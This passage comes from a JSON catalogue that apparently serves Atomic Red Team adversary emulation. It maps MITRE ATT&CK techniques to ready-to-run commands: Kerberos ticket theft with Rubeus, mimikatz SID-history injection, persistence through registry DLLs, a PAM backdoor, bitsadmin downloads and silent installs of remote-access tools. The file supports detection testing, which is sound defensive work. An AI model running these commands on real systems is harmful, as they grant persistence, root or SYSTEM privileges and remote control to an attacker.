         "command": "& \"C:\\Users\\puma-4\\Desktop\\PsExec.exe\" -accepteula \\\\localhost -w c:\\ -c \"C:\\Users\\puma-4\\Desktop\\Rubeus.exe\" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; Set-Location \"C:\\Users\\puma-4\\Desktop\\\"; Move-Item -Force \"\\\\localhost\\c$\\ticket.kirbi\" ticket.kirbi; Write-Host \"Successfully retrieved TGT from 'localhost', now requesting a TGS from local\"; & \"C:\\Users\\puma-4\\Desktop\\Rubeus.exe\" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item \"C:\\Users\\puma-4\\Desktop\\ticket.kirbi\"; & \"C:\\Users\\puma-4\\Desktop\\Rubeus.exe\" purge"
      }
   ],
   "T1547": [
      {
         "technique_id": "T1547",
         "technique_name": "Boot or Logon Autostart Execution",
         "tactic": "multiple",
         "description": "Install a driver via pnputil.exe lolbin\n",
         "command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\""
      }
   ],
   "T1547.012": [
      {
         "technique_id": "T1547.012",
         "technique_name": "Boot or Logon Autostart Execution: Print Processors",
         "tactic": "multiple",
         "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
         "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}; net stop spooler; Copy-Item \"C:\\Users\\puma-4\\Desktop\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f; net start spooler;"
      }
   ],
   "T1574.001": [
      {
         "technique_id": "T1574.001",
         "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
         "tactic": "multiple",
         "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
         "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe && copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll && %APPDATA%\\updater.exe -Command exit"
      }
   ],
   "T1546.009": [
      {
         "technique_id": "T1546.009",
         "technique_name": "Event Triggered Execution: AppCert DLLs",
         "tactic": "multiple",
         "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
         "command": "Copy-Item \"7e8ee7_AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; if($false){Restart-Computer}"
      }
   ],
   "T1197": [
      {
         "technique_id": "T1197",
         "technique_name": "BITS Jobs",
         "tactic": "multiple",
         "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
         "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr"
      },
      {
         "technique_id": "T1197",
         "technique_name": "BITS Jobs",
         "tactic": "multiple",
         "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
         "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1"
      },
      {
         "technique_id": "T1197",
         "technique_name": "BITS Jobs",
         "tactic": "multiple",
         "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
         "command": "bitsadmin.exe /create AtomicBITS && bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1 && bitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL && bitsadmin.exe /resume AtomicBITS && ping -n 5 127.0.0.1 >nul 2>&1 && bitsadmin.exe /complete AtomicBITS"
      },
      {
         "technique_id": "T1197",
         "technique_name": "BITS Jobs",
         "tactic": "multiple",
         "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
         "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1"
      }
   ],
   "T1574.006": [
      {
         "technique_id": "T1574.006",
         "technique_name": "Hijack Execution Flow: LD_PRELOAD",
         "tactic": "multiple",
         "description": "injects a dylib that opens calculator via env variable\n",
         "command": "DYLD_INSERT_LIBRARIES=/tmp/T1574006MOS.dylib /Applications/Firefox.app/Contents/MacOS/firefox"
      },
      {
         "technique_id": "T1574.006",
         "technique_name": "Hijack Execution Flow: LD_PRELOAD",
         "tactic": "multiple",
         "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n",
         "command": "LD_PRELOAD=/tmp/T1574006.so ls"
      },
      {
         "technique_id": "T1574.006",
         "technique_name": "Hijack Execution Flow: LD_PRELOAD",
         "tactic": "multiple",
         "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n",
         "command": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'"
      }
   ],
   "T1574.011": [
      {
         "technique_id": "T1574.011",
         "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
         "tactic": "multiple",
         "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
         "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL"
      },
      {
         "technique_id": "T1574.011",
         "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
         "tactic": "multiple",
         "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
         "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\""
      }
   ],
   "T1037.004": [
      {
         "technique_id": "T1037.004",
         "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
         "tactic": "multiple",
         "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
         "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common"
      },
      {
         "technique_id": "T1037.004",
         "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
         "tactic": "multiple",
         "description": "Modify rc.common\n",
         "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common"
      },
      {
         "technique_id": "T1037.004",
         "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
         "tactic": "multiple",
         "description": "Modify rc.local\n",
         "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local"
      }
   ],
   "T1037.001": [
      {
         "technique_id": "T1037.001",
         "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
         "tactic": "multiple",
         "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
         "command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat && REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f"
      }
   ],
   "T1037.005": [
      {
         "technique_id": "T1037.005",
         "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
         "tactic": "multiple",
         "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
         "command": "sudo touch /Library/StartupItems/EvilStartup.plist"
      }
   ],
   "T1543.003": [
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "multiple",
         "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
         "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" && sc start Fax"
      },
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "multiple",
         "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
         "command": "sc.exe \\\\localhost create AtomicTestService_CMD binPath= \"411da5_AtomicService.exe\" start=auto type=Own && sc.exe \\\\localhost start AtomicTestService_CMD"
      },
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "multiple",
         "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
         "command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"C:\\Users\\puma-4\\Desktop\\411da5_AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\""
      },
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "multiple",
         "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
         "command": "copy \"$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll\" %systemroot%\\system32\\ && sc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto && sc config W64Time DisplayName= \"Windows 64 Time\" && sc description W64Time \"Maintain date and time synch on all clients and services in the network\" && reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f && sc start W64Time"
      },
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "multiple",
         "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
         "command": "sc.exe create AtomicTestService_CMD binPath= \"411da5_AtomicService.exe\" start=auto  type=Own && sc.exe start AtomicTestService_CMD"
      },
      {
         "technique_id": "T1543.003",
         "technique_name": "Create or Modify System Process: Windows Service",
         "tactic": "persistence",
         "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
         "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n"
      }
   ],
   "T1134.005": [
      {
         "technique_id": "T1134.005",
         "technique_name": "Access Token Manipulation: SID-History Injection",
         "tactic": "multiple",
         "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
         "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username\" \"exit\""
      }
   ],
   "T1546.002": [
      {
         "technique_id": "T1546.002",
         "technique_name": "Event Triggered Execution: Screensaver",
         "tactic": "multiple",
         "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
         "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg && copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\" && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f && if 0 NEQ 0 shutdown /r /t 0"
      }
   ],
   "T1556.003": [
      {
         "technique_id": "T1556.003",
         "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
         "tactic": "multiple",
         "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
         "command": "sudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l"
      },
      {
         "technique_id": "T1556.003",
         "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
         "tactic": "multiple",
         "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
         "command": "if [ -f /tmp/pam_evil.so ]; then : ; else sudo gcc -shared -fPIC -o /tmp/pam_evil.so 8545b9_pam_evil.c; fi; if [ -f /usr/include/security/pam_modules.h ]; then : ; else if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi; fi;  ;  sudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l"
      }
   ],
   "T1546.014": [
      {
         "technique_id": "T1546.014",
         "technique_name": "Event Triggered Execution: Emond",
         "tactic": "multiple",
         "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
         "command": "sudo cp \"d6d565_T1546.014_emond.plist\" /etc/emond.d/rules/T1546.014_emond.plist; sudo touch /private/var/db/emondClients/T1546.014"
      }
   ],
   "T1556.002": [
      {
         "technique_id": "T1556.002",
         "technique_name": "Modify Authentication Process: Password Filter DLL",
         "tactic": "multiple",
         "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
         "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"C:\\Users\\puma-4\\Desktop\\lsa_backup.reg\"; $passwordFilterName = (Copy-Item \"C:\\Users\\puma-4\\Desktop\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"; $notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues"
      }
   ],
   "T1610": [
      {
         "technique_id": "T1610",
         "technique_name": "Deploy a container",
         "tactic": "multiple",
         "description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n",
         "command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/; docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh"
      }
   ],
   "T1574.009": [
      {
         "technique_id": "T1574.009",
         "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
         "tactic": "multiple",
         "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
         "command": "copy \"0655d1_WindowsServiceExample.exe\" \"C:\\Program Files\\windows_service.exe\" && copy \"0655d1_WindowsServiceExample.exe\" \"C:\\program.exe\" && sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto && sc start \"Example Service\""
      }
   ],
   "T1133": [
      {
         "technique_id": "T1133",
         "technique_name": "External Remote Services",
         "tactic": "multiple",
         "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
         "command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name \"chrome\""
      }
   ],
   "T1574.008": [
      {
         "technique_id": "T1574.008",
         "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
         "tactic": "multiple",
         "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"C:\\Users\\puma-4\\Desktop\\calc.cs\"; Powershell -noprofile"
      }
   ],
   "T1055.004": [
      {
         "technique_id": "T1055.004",
         "technique_name": "Process Injection: Asynchronous Procedure Call",
         "tactic": "multiple",
         "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
         "command": "\"0cb710_T1055.exe\""
      }
   ],
   "T1056.004": [
      {
         "technique_id": "T1056.004",
         "technique_name": "Input Capture: Credential API Hooking",
         "tactic": "multiple",
         "description": "Hooks functions in PowerShell to read TLS Communications\n",
         "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"; Invoke-WebRequest"
      }
   ],
   "T1091": [
      {
         "technique_id": "T1091",
         "technique_name": "Replication Through Removable Media",
         "tactic": "multiple",
         "description": "Simulates an adversary copying malware to all connected removable drives. \n",
         "command": "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; write-host \"Removable Drive Found:\" $Drive; New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"; }"
      }
   ],
   "T1547.002": [
      {
         "technique_id": "T1547.002",
         "technique_name": "Authentication Package",
         "tactic": "multiple",
         "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
         "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\package.dll\" C:\\Windows\\System32\\; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f"
      }
   ],
   "T1547.008": [
      {
         "technique_id": "T1547.008",
         "technique_name": "Boot or Logon Autostart Execution: LSASS Driver",
         "tactic": "multiple",
         "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
         "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\""
      }
   ],
   "T1546.013": [
      {
         "technique_id": "T1546.013",
         "technique_name": "Event Triggered Execution: PowerShell Profile",
         "tactic": "multiple",
         "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
         "command": "Add-Content $profile -Value \"\"; Add-Content $profile -Value \"Start-Process calc.exe\"; powershell -Command exit"
      }
   ],
   "T1219": [
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
         "command": "Start-Process -Wait -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru; Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'"
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
         "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Start-Process $file1 /S; "
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
         "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"; $file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"; Start-Process $file1 /S; "
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
         "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe\""
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
         "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe\" -ArgumentList \"/S /v/qn\""
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
         "command": "Start-Process $env:ProgramFiles\\Connect\\Connect.exe"
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
         "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"; msiexec /i $installer /qn"
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
         "command": "Start-Process \"$env:ProgramFiles\\RealVNC\\VNC Viewer\\vncviewer.exe\""
      },
      {
         "technique_id": "T1219",
         "technique_name": "Remote Access Software",
         "tactic": "command-and-control",
         "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
         "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\""
      },
      {
